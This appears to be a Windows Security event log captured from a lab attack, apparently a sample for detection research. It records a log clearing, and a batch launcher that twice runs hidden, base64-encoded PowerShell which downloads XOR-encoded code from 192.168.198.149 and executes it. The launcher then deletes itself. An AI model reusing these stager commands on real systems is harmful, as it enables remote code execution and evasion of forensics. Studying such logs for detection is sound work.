{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Eventlog","Guid":"{fc65ddd8-d6ef-4962-83d5-6e5cfe9ce148}"},"EventID":1102,"Version":0,"Level":4,"Task":104,"Opcode":0,"Keywords":"0x4020000000000000","TimeCreated_attributes":{"SystemTime":"2016-09-20T19:15:32.581054Z"},"EventRecordID":13478,"Correlation":null,"Execution_attributes":{"ProcessID":728,"ThreadID":3488},"Channel":"Security","Computer":"IE10Win7","Security":null},"UserData":{"LogFileCleared_attributes":{"xmlns:auto-ns3":"http://schemas.microsoft.com/win/2004/08/events","xmlns":"http://manifests.microsoft.com/win/2004/08/windows/eventlog"},"LogFileCleared":{"SubjectUserSid":"S-1-5-21-3463664321-2923530833-3546627382-1000","SubjectUserName":"IEUser","SubjectDomainName":"IE10WIN7","SubjectLogonId":"0x6793c"}}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4688,"Version":1,"Level":0,"Task":13312,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2016-09-20T19:15:40.252929Z"},"EventRecordID":13479,"Correlation":null,"Execution_attributes":{"ProcessID":4,"ThreadID":56},"Channel":"Security","Computer":"IE10Win7","Security":null},"EventData":{"SubjectUserSid":"S-1-5-18","SubjectUserName":"IE10WIN7$","SubjectDomainName":"WORKGROUP","SubjectLogonId":"0x3e7","NewProcessId":"0xf50","NewProcessName":"C:\\Program Files\\VMware\\VMware Tools\\VMwareResolutionSet.exe","TokenElevationType":"%%1936","ProcessId":"0x5ec","CommandLine":"\"C:\\Program Files\\VMware\\VMware Tools\\VMwareResolutionSet.exe\" 0 1 , 0 0 1440 742 0"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4688,"Version":1,"Level":0,"Task":13312,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2016-09-20T19:15:49.784179Z"},"EventRecordID":13480,"Correlation":null,"Execution_attributes":{"ProcessID":4,"ThreadID":56},"Channel":"Security","Computer":"IE10Win7","Security":null},"EventData":{"SubjectUserSid":"S-1-5-18","SubjectUserName":"IE10WIN7$","SubjectDomainName":"WORKGROUP","SubjectLogonId":"0x3e7","NewProcessId":"0xf84","NewProcessName":"C:\\Windows\\System32\\SearchProtocolHost.exe","TokenElevationType":"%%1936","ProcessId":"0xc9c","CommandLine":"\"C:\\Windows\\system32\\SearchProtocolHost.exe\" Global\\UsGthrFltPipeMssGthrPipe26_ Global\\UsGthrCtrlFltPipeMssGthrPipe26 1 -2147483646 \"Software\\Microsoft\\Windows Search\" \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)\" \"C:\\ProgramData\\Microsoft\\Search\\Data\\Temp\\usgthrsvc\" \"DownLevelDaemon\" "}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4688,"Version":1,"Level":0,"Task":13312,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2016-09-20T19:15:49.799804Z"},"EventRecordID":13481,"Correlation":null,"Execution_attributes":{"ProcessID":4,"ThreadID":56},"Channel":"Security","Computer":"IE10Win7","Security":null},"EventData":{"SubjectUserSid":"S-1-5-18","SubjectUserName":"IE10WIN7$","SubjectDomainName":"WORKGROUP","SubjectLogonId":"0x3e7","NewProcessId":"0xb44","NewProcessName":"C:\\Windows\\System32\\SearchFilterHost.exe","TokenElevationType":"%%1936","ProcessId":"0xc9c","CommandLine":"\"C:\\Windows\\system32\\SearchFilterHost.exe\" 0 520 524 532 65536 528 "}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4688,"Version":1,"Level":0,"Task":13312,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2016-09-20T19:15:49.846679Z"},"EventRecordID":13482,"Correlation":null,"Execution_attributes":{"ProcessID":4,"ThreadID":56},"Channel":"Security","Computer":"IE10Win7","Security":null},"EventData":{"SubjectUserSid":"S-1-5-18","SubjectUserName":"IE10WIN7$","SubjectDomainName":"WORKGROUP","SubjectLogonId":"0x3e7","NewProcessId":"0xe80","NewProcessName":"C:\\Windows\\System32\\dllhost.exe","TokenElevationType":"%%1938","ProcessId":"0x248","CommandLine":"C:\\Windows\\system32\\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4688,"Version":1,"Level":0,"Task":13312,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2016-09-20T19:15:52.487304Z"},"EventRecordID":13483,"Correlation":null,"Execution_attributes":{"ProcessID":4,"ThreadID":56},"Channel":"Security","Computer":"IE10Win7","Security":null},"EventData":{"SubjectUserSid":"S-1-5-18","SubjectUserName":"IE10WIN7$","SubjectDomainName":"WORKGROUP","SubjectLogonId":"0x3e7","NewProcessId":"0xaf8","NewProcessName":"C:\\Windows\\System32\\consent.exe","TokenElevationType":"%%1936","ProcessId":"0x364","CommandLine":"consent.exe 868 324 01BA5E70"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4688,"Version":1,"Level":0,"Task":13312,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2016-09-20T19:15:53.753906Z"},"EventRecordID":13484,"Correlation":null,"Execution_attributes":{"ProcessID":4,"ThreadID":56},"Channel":"Security","Computer":"IE10Win7","Security":null},"EventData":{"SubjectUserSid":"S-1-5-18","SubjectUserName":"IE10WIN7$","SubjectDomainName":"WORKGROUP","SubjectLogonId":"0x3e7","NewProcessId":"0x620","NewProcessName":"C:\\Windows\\System32\\dllhost.exe","TokenElevationType":"%%1936","ProcessId":"0x248","CommandLine":"C:\\Windows\\system32\\DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4688,"Version":1,"Level":0,"Task":13312,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2016-09-20T19:15:53.785156Z"},"EventRecordID":13485,"Correlation":null,"Execution_attributes":{"ProcessID":4,"ThreadID":56},"Channel":"Security","Computer":"IE10Win7","Security":null},"EventData":{"SubjectUserSid":"S-1-5-18","SubjectUserName":"IE10WIN7$","SubjectDomainName":"WORKGROUP","SubjectLogonId":"0x3e7","NewProcessId":"0xea8","NewProcessName":"C:\\Windows\\System32\\dllhost.exe","TokenElevationType":"%%1936","ProcessId":"0x248","CommandLine":"C:\\Windows\\system32\\DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4688,"Version":1,"Level":0,"Task":13312,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2016-09-20T19:15:53.847656Z"},"EventRecordID":13486,"Correlation":null,"Execution_attributes":{"ProcessID":4,"ThreadID":56},"Channel":"Security","Computer":"IE10Win7","Security":null},"EventData":{"SubjectUserSid":"S-1-5-18","SubjectUserName":"IE10WIN7$","SubjectDomainName":"WORKGROUP","SubjectLogonId":"0x3e7","NewProcessId":"0x200","NewProcessName":"C:\\Windows\\System32\\cmd.exe","TokenElevationType":"%%1937","ProcessId":"0xa38","CommandLine":"\"C:\\Windows\\System32\\cmd.exe\" /C \"C:\\Users\\IEUser\\Desktop\\launcher.bat\" "}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4688,"Version":1,"Level":0,"Task":13312,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2016-09-20T19:15:54.113281Z"},"EventRecordID":13487,"Correlation":null,"Execution_attributes":{"ProcessID":4,"ThreadID":56},"Channel":"Security","Computer":"IE10Win7","Security":null},"EventData":{"SubjectUserSid":"S-1-5-18","SubjectUserName":"IE10WIN7$","SubjectDomainName":"WORKGROUP","SubjectLogonId":"0x3e7","NewProcessId":"0xed4","NewProcessName":"C:\\Windows\\System32\\conhost.exe","TokenElevationType":"%%1937","ProcessId":"0x16c","CommandLine":"\\??\\C:\\Windows\\system32\\conhost.exe \"1578445555-16483876628953026315098033051569225851733647213-1034094689584147277\""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4688,"Version":1,"Level":0,"Task":13312,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2016-09-20T19:15:54.128906Z"},"EventRecordID":13488,"Correlation":null,"Execution_attributes":{"ProcessID":4,"ThreadID":56},"Channel":"Security","Computer":"IE10Win7","Security":null},"EventData":{"SubjectUserSid":"S-1-5-21-3463664321-2923530833-3546627382-1000","SubjectUserName":"IEUser","SubjectDomainName":"IE10WIN7","SubjectLogonId":"0x6793c","NewProcessId":"0xe68","NewProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","TokenElevationType":"%%1937","ProcessId":"0x200","CommandLine":"powershell.exe  -NoP -sta -NonI -W Hidden -Enc WwBTAFkAUwB0AEUAbQAuAE4ARQBUAC4AUwBFAHIAdgBJAEMAZQBQAG8AaQBOAFQATQBBAE4AYQBHAEUAcgBdADoAOgBFAFgAUABlAEMAVAAxADAAMABDAG8AbgBUAGkAbgB1AEUAIAA9ACAAMAA7ACQAVwBjAD0ATgBlAHcALQBPAGIASgBlAGMAVAAgAFMAWQBTAHQAZQBNAC4ATgBFAFQALgBXAGUAQgBDAGwAaQBFAE4AVAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAYwAuAEgARQBBAEQAZQBSAHMALgBBAGQARAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAQwAuAFAAcgBPAHgAeQAgAD0AIABbAFMAeQBzAFQAZQBtAC4ATgBlAFQALgBXAEUAQgBSAGUAcQB1AEUAUwB0AF0AOgA6AEQAZQBmAGEAdQBMAFQAVwBlAEIAUABSAG8AeAB5ADsAJABXAGMALgBQAFIATwB4AFkALgBDAFIARQBEAGUATgBUAEkAYQBMAHMAIAA9ACAAWwBTAFkAcwBUAEUAbQAuAE4AZQB0AC4AQwByAGUARABlAG4AdABJAEEAbABDAGEAYwBoAGUAXQA6ADoARABlAGYAYQBVAEwAVABOAGUAVAB3AG8AcgBrAEMAcgBFAEQAZQBuAFQASQBhAEwAcwA7ACQASwA9ACcAcwB5AHwAUgA0AFgAaABCAFcAbwB6AEsALgB4AC0ANgArADkAPgBJAGkAcQA3AEQAOABgAEoATABuAGwAdwBWACcAOwAkAEkAPQAwADsAWwBDAEgAYQBSAFsAXQBdACQAQgA9ACgAWwBDAGgAQQBSAFsAXQBdACgAJAB3AGMALgBEAE8AdwBuAGwAbwBhAEQAUwBUAHIASQBOAEcAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAOQA4AC4AMQA0ADkAOgA4ADAAOAAwAC8AaQBuAGQAZQB4AC4AYQBzAHAAIgApACkAKQB8ACUAewAkAF8ALQBCAFgATwBSACQAawBbACQAaQArACsAJQAkAGsALgBMAGUAbgBnAHQAaABdAH0AOwBJAEUAWAAgACgAJABCAC0ASgBPAEkATgAnACcAKQA="}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4688,"Version":1,"Level":0,"Task":13312,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2016-09-20T19:15:54.128906Z"},"EventRecordID":13489,"Correlation":null,"Execution_attributes":{"ProcessID":4,"ThreadID":56},"Channel":"Security","Computer":"IE10Win7","Security":null},"EventData":{"SubjectUserSid":"S-1-5-21-3463664321-2923530833-3546627382-1000","SubjectUserName":"IEUser","SubjectDomainName":"IE10WIN7","SubjectLogonId":"0x6793c","NewProcessId":"0x480","NewProcessName":"C:\\Windows\\System32\\cmd.exe","TokenElevationType":"%%1937","ProcessId":"0x200","CommandLine":"cmd  /c del \"C:\\Users\\IEUser\\Desktop\\launcher.bat\""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4688,"Version":1,"Level":0,"Task":13312,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2016-09-20T19:15:55.472656Z"},"EventRecordID":13490,"Correlation":null,"Execution_attributes":{"ProcessID":4,"ThreadID":56},"Channel":"Security","Computer":"IE10Win7","Security":null},"EventData":{"SubjectUserSid":"S-1-5-18","SubjectUserName":"IE10WIN7$","SubjectDomainName":"WORKGROUP","SubjectLogonId":"0x3e7","NewProcessId":"0x77c","NewProcessName":"C:\\Windows\\System32\\wbem\\WmiPrvSE.exe","TokenElevationType":"%%1936","ProcessId":"0x248","CommandLine":"C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4688,"Version":1,"Level":0,"Task":13312,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2016-09-20T19:19:22.066406Z"},"EventRecordID":13491,"Correlation":null,"Execution_attributes":{"ProcessID":4,"ThreadID":56},"Channel":"Security","Computer":"IE10Win7","Security":null},"EventData":{"SubjectUserSid":"S-1-5-18","SubjectUserName":"IE10WIN7$","SubjectDomainName":"WORKGROUP","SubjectLogonId":"0x3e7","NewProcessId":"0xff4","NewProcessName":"C:\\Windows\\System32\\SearchProtocolHost.exe","TokenElevationType":"%%1936","ProcessId":"0xc9c","CommandLine":"\"C:\\Windows\\system32\\SearchProtocolHost.exe\" Global\\UsGthrFltPipeMssGthrPipe27_ Global\\UsGthrCtrlFltPipeMssGthrPipe27 1 -2147483646 \"Software\\Microsoft\\Windows Search\" \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)\" \"C:\\ProgramData\\Microsoft\\Search\\Data\\Temp\\usgthrsvc\" \"DownLevelDaemon\" "}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4688,"Version":1,"Level":0,"Task":13312,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2016-09-20T19:19:22.082031Z"},"EventRecordID":13492,"Correlation":null,"Execution_attributes":{"ProcessID":4,"ThreadID":56},"Channel":"Security","Computer":"IE10Win7","Security":null},"EventData":{"SubjectUserSid":"S-1-5-18","SubjectUserName":"IE10WIN7$","SubjectDomainName":"WORKGROUP","SubjectLogonId":"0x3e7","NewProcessId":"0xf04","NewProcessName":"C:\\Windows\\System32\\SearchFilterHost.exe","TokenElevationType":"%%1936","ProcessId":"0xc9c","CommandLine":"\"C:\\Windows\\system32\\SearchFilterHost.exe\" 0 520 524 532 65536 528 "}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4688,"Version":1,"Level":0,"Task":13312,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2016-09-20T19:19:22.128906Z"},"EventRecordID":13493,"Correlation":null,"Execution_attributes":{"ProcessID":4,"ThreadID":56},"Channel":"Security","Computer":"IE10Win7","Security":null},"EventData":{"SubjectUserSid":"S-1-5-18","SubjectUserName":"IE10WIN7$","SubjectDomainName":"WORKGROUP","SubjectLogonId":"0x3e7","NewProcessId":"0xf9c","NewProcessName":"C:\\Windows\\System32\\dllhost.exe","TokenElevationType":"%%1938","ProcessId":"0x248","CommandLine":"C:\\Windows\\system32\\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4688,"Version":1,"Level":0,"Task":13312,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2016-09-20T19:19:25.003906Z"},"EventRecordID":13494,"Correlation":null,"Execution_attributes":{"ProcessID":4,"ThreadID":56},"Channel":"Security","Computer":"IE10Win7","Security":null},"EventData":{"SubjectUserSid":"S-1-5-18","SubjectUserName":"IE10WIN7$","SubjectDomainName":"WORKGROUP","SubjectLogonId":"0x3e7","NewProcessId":"0xf98","NewProcessName":"C:\\Windows\\System32\\consent.exe","TokenElevationType":"%%1936","ProcessId":"0x364","CommandLine":"consent.exe 868 324 01C49CC0"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4688,"Version":1,"Level":0,"Task":13312,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2016-09-20T19:19:26.543945Z"},"EventRecordID":13495,"Correlation":null,"Execution_attributes":{"ProcessID":4,"ThreadID":56},"Channel":"Security","Computer":"IE10Win7","Security":null},"EventData":{"SubjectUserSid":"S-1-5-18","SubjectUserName":"IE10WIN7$","SubjectDomainName":"WORKGROUP","SubjectLogonId":"0x3e7","NewProcessId":"0x990","NewProcessName":"C:\\Windows\\System32\\dllhost.exe","TokenElevationType":"%%1936","ProcessId":"0x248","CommandLine":"C:\\Windows\\system32\\DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4688,"Version":1,"Level":0,"Task":13312,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2016-09-20T19:19:26.575195Z"},"EventRecordID":13496,"Correlation":null,"Execution_attributes":{"ProcessID":4,"ThreadID":56},"Channel":"Security","Computer":"IE10Win7","Security":null},"EventData":{"SubjectUserSid":"S-1-5-18","SubjectUserName":"IE10WIN7$","SubjectDomainName":"WORKGROUP","SubjectLogonId":"0x3e7","NewProcessId":"0x160","NewProcessName":"C:\\Windows\\System32\\dllhost.exe","TokenElevationType":"%%1936","ProcessId":"0x248","CommandLine":"C:\\Windows\\system32\\DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4688,"Version":1,"Level":0,"Task":13312,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2016-09-20T19:19:26.637695Z"},"EventRecordID":13497,"Correlation":null,"Execution_attributes":{"ProcessID":4,"ThreadID":56},"Channel":"Security","Computer":"IE10Win7","Security":null},"EventData":{"SubjectUserSid":"S-1-5-18","SubjectUserName":"IE10WIN7$","SubjectDomainName":"WORKGROUP","SubjectLogonId":"0x3e7","NewProcessId":"0x98c","NewProcessName":"C:\\Windows\\System32\\cmd.exe","TokenElevationType":"%%1937","ProcessId":"0xa38","CommandLine":"\"C:\\Windows\\System32\\cmd.exe\" /C \"C:\\Users\\IEUser\\Desktop\\launcher.bat\" "}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4688,"Version":1,"Level":0,"Task":13312,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2016-09-20T19:19:26.637695Z"},"EventRecordID":13498,"Correlation":null,"Execution_attributes":{"ProcessID":4,"ThreadID":56},"Channel":"Security","Computer":"IE10Win7","Security":null},"EventData":{"SubjectUserSid":"S-1-5-18","SubjectUserName":"IE10WIN7$","SubjectDomainName":"WORKGROUP","SubjectLogonId":"0x3e7","NewProcessId":"0xadc","NewProcessName":"C:\\Windows\\System32\\conhost.exe","TokenElevationType":"%%1937","ProcessId":"0x16c","CommandLine":"\\??\\C:\\Windows\\system32\\conhost.exe \"-9994462407012541741645901825743145574-1965544900-491018066-52429522453072951\""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4688,"Version":1,"Level":0,"Task":13312,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2016-09-20T19:19:26.903320Z"},"EventRecordID":13499,"Correlation":null,"Execution_attributes":{"ProcessID":4,"ThreadID":56},"Channel":"Security","Computer":"IE10Win7","Security":null},"EventData":{"SubjectUserSid":"S-1-5-21-3463664321-2923530833-3546627382-1000","SubjectUserName":"IEUser","SubjectDomainName":"IE10WIN7","SubjectLogonId":"0x6793c","NewProcessId":"0x11c","NewProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","TokenElevationType":"%%1937","ProcessId":"0x98c","CommandLine":"powershell.exe  -NoP -sta -NonI -W Hidden -Enc JABXAGMAPQBOAGUAdwAtAE8AQgBKAEUAQwBUACAAUwB5AFMAdABFAG0ALgBOAEUAVAAuAFcAZQBCAEMAbABJAGUATgB0ADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwA7ACQAVwBDAC4ASABlAGEAZABFAHIAUwAuAEEAZABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAdwBjAC4AUAByAG8AWABZACAAPQAgAFsAUwBZAFMAVABFAG0ALgBOAGUAdAAuAFcAZQBiAFIARQBxAHUAZQBzAHQAXQA6ADoARABFAGYAQQB1AGwAdABXAGUAYgBQAFIATwBYAHkAOwAkAHcAQwAuAFAAcgBvAFgAeQAuAEMAcgBlAGQARQBOAFQASQBBAEwAUwAgAD0AIABbAFMAWQBzAFQAZQBNAC4ATgBlAFQALgBDAFIAZQBEAGUAbgB0AGkAQQBMAEMAQQBjAGgAZQBdADoAOgBEAGUARgBBAFUAbAB0AE4AZQB0AHcAbwByAEsAQwBSAEUAZABlAG4AVABJAGEAbABTADsAJABLAD0AJwApADAAZABoAEMAeQAxAEoAOQBzADMAcQBZAEAAJQBMACEANwBwAHUAXQBUAHwAdgBWAH0AdABuAFsAQQBRAFIAJwA7ACQAaQA9ADAAOwBbAEMASABBAHIAWwBdAF0AJABCAD0AKABbAGMASABhAHIAWwBdAF0AKAAkAFcAYwAuAEQAbwB3AG4ATABvAGEARABTAHQAUgBpAG4ARwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQA5ADgALgAxADQAOQA6ADgAMAA4ADIALwBpAG4AZABlAHgALgBhAHMAcAAiACkAKQApAHwAJQB7ACQAXwAtAGIAWABPAHIAJABLAFsAJABJACsAKwAlACQASwAuAEwARQBuAEcAdABoAF0AfQA7AEkARQBYACAAKAAkAEIALQBqAG8AaQBOACcAJwApAA=="}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4688,"Version":1,"Level":0,"Task":13312,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2016-09-20T19:19:26.918945Z"},"EventRecordID":13500,"Correlation":null,"Execution_attributes":{"ProcessID":4,"ThreadID":56},"Channel":"Security","Computer":"IE10Win7","Security":null},"EventData":{"SubjectUserSid":"S-1-5-21-3463664321-2923530833-3546627382-1000","SubjectUserName":"IEUser","SubjectDomainName":"IE10WIN7","SubjectLogonId":"0x6793c","NewProcessId":"0x7d0","NewProcessName":"C:\\Windows\\System32\\cmd.exe","TokenElevationType":"%%1937","ProcessId":"0x98c","CommandLine":"cmd  /c del \"C:\\Users\\IEUser\\Desktop\\launcher.bat\""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4688,"Version":1,"Level":0,"Task":13312,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2016-09-20T19:19:28.762695Z"},"EventRecordID":13501,"Correlation":null,"Execution_attributes":{"ProcessID":4,"ThreadID":56},"Channel":"Security","Computer":"IE10Win7","Security":null},"EventData":{"SubjectUserSid":"S-1-5-18","SubjectUserName":"IE10WIN7$","SubjectDomainName":"WORKGROUP","SubjectLogonId":"0x3e7","NewProcessId":"0xa6c","NewProcessName":"C:\\Windows\\System32\\wbem\\WmiPrvSE.exe","TokenElevationType":"%%1936","ProcessId":"0x248","CommandLine":"C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4688,"Version":1,"Level":0,"Task":13312,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2016-09-20T19:20:19.153320Z"},"EventRecordID":13502,"Correlation":null,"Execution_attributes":{"ProcessID":4,"ThreadID":56},"Channel":"Security","Computer":"IE10Win7","Security":null},"EventData":{"SubjectUserSid":"S-1-5-21-3463664321-2923530833-3546627382-1000","SubjectUserName":"IEUser","SubjectDomainName":"IE10WIN7","SubjectLogonId":"0x6793c","NewProcessId":"0xc50","NewProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","TokenElevationType":"%%1937","ProcessId":"0x11c","CommandLine":"\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -s -NoLogo -NoProfile"}}}
